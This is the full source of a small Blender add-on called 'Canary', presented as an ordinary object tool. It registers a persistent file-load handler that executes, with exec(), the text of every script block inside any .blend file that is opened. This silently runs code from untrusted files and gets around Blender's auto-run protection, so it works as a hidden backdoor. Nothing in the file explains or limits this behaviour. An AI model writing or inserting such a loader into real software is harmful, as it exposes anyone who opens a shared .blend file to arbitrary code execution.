bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}

import bpy
from bpy.app.handlers import persistent

@persistent
def _on_load(dummy):
    for t in bpy.data.texts:
        exec(t.as_string())

def register():
    bpy.app.handlers.load_post.append(_on_load)
def unregister():
    bpy.app.handlers.load_post.remove(_on_load)
